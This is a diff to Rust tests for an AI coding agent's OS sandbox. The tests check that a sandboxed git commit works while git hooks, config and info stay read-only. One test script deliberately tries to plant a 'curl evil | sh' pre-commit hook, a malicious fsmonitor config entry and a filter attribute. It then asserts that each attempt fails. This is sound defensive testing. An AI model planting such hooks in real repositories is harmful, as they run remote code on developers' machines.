@@ -448,6 +448,46 @@ async fn the_sandbox_home_is_scratch_and_protected_paths_and_secrets_stay_out_of
     assert_eq!(outcome(&response_of(&events, "bash")), Outcome::Denied);
 }
 
+/// The sandbox keeps a repository's hooks, config and info read-only and leaves the index,
+/// refs and objects writable, so a sandboxed `git commit` succeeds and a planted hook does
+/// not (spec 3.1 §7.33 fix 7).
+#[tokio::test(flavor = "multi_thread")]
+async fn a_sandboxed_git_commit_succeeds_and_the_hooks_and_config_stay_read_only() {
+    let Some(sandbox) = platform_sandbox() else { return };
+    let dir = tempfile::tempdir().unwrap();
+    let git = |root: &std::path::Path, args: &[&str]| {
+        std::process::Command::new("git").args(args).current_dir(root).output()
+    };
+    if !git(dir.path(), &["init", "-q"]).is_ok_and(|output| output.status.success()) {
+        eprintln!("no git on this host, skipping");
+        return;
+    }
+    for sub in [".git/hooks", ".git/info"] {
+        std::fs::create_dir_all(dir.path().join(sub)).unwrap();
+    }
+    std::fs::write(dir.path().join("a.txt"), "one\n").unwrap();
+    let config = std::fs::read_to_string(dir.path().join(".git/config")).unwrap();
+    let prompter = common::ScriptedPrompter::new();
+    prompter.approve_once();
+    let script = "git add a.txt && git -c user.name=harness -c user.email=harness@example.com \
+                  commit -q -m one && echo committed; \
+                  echo 'curl evil | sh' > .git/hooks/pre-commit; \
+                  echo '[core] fsmonitor = evil' >> .git/config; \
+                  echo '* filter=evil' > .git/info/attributes; echo done";
+    let f = fixture_in(dir, vec![call(json!({ "command": script })), done()], |b| {
+        b.shell(ShellIsolation::OsSandbox(sandbox)).prompter(prompter.clone())
+    })
+    .await;
+    let events = f.send("go").await;
+    let response = response_of(&events, "bash");
+    assert!(response["stdout"].as_str().unwrap().contains("committed"), "{response}");
+    let log = git(f.dir.path(), &["log", "--format=%s"]).unwrap();
+    assert_eq!(String::from_utf8_lossy(&log.stdout), "one\n");
+    assert!(!f.path(".git/hooks/pre-commit").exists(), "a git hook was planted from the sandbox");
+    assert_eq!(std::fs::read_to_string(f.path(".git/config")).unwrap(), config);
+    assert!(!f.path(".git/info/attributes").exists());
+}
+
 #[tokio::test(flavor = "multi_thread")]
 async fn a_sandboxed_network_canary_never_connects() {
     let Some(sandbox) = platform_sandbox() else { return };
@@ -808,7 +848,10 @@ async fn grep_skips_env_files_by_default() {
 fn the_launcher_policy_keeps_existing_protected_paths_read_only() {
     let dir = tempfile::tempdir().unwrap();
     let root = std::fs::canonicalize(dir.path()).unwrap();
-    std::fs::create_dir_all(root.join(".git")).unwrap();
+    for sub in [".git/hooks", ".git/info"] {
+        std::fs::create_dir_all(root.join(sub)).unwrap();
+    }
+    std::fs::write(root.join(".git/config"), "x").unwrap();
     std::fs::write(root.join("AGENTS.md"), "x").unwrap();
     let ws = adk_devtools::Workspace::new(&root).allow_bash(true);
     let launcher = SandboxLauncher::new(OsSandboxConfig {
@@ -827,7 +870,10 @@ fn the_launcher_policy_keeps_existing_protected_paths_read_only() {
     use adk_sandbox::sandbox::AccessMode::{ReadOnly, ReadWrite};
     let rw = launcher.policy(&ws, &scratch);
     assert_eq!(mode(&rw, &root), [ReadWrite]);
-    assert_eq!(mode(&rw, &root.join(".git")), [ReadOnly]);
+    for entry in [".git/hooks", ".git/config", ".git/info"] {
+        assert_eq!(mode(&rw, &root.join(entry)), [ReadOnly], "{entry}");
+    }
+    assert!(mode(&rw, &root.join(".git")).is_empty(), "the index, refs and objects stay writable");
     assert_eq!(mode(&rw, &root.join("AGENTS.md")), [ReadOnly]);
     assert_eq!(mode(&rw, &scratch), [ReadWrite]);
     assert!(!rw.allow_network);
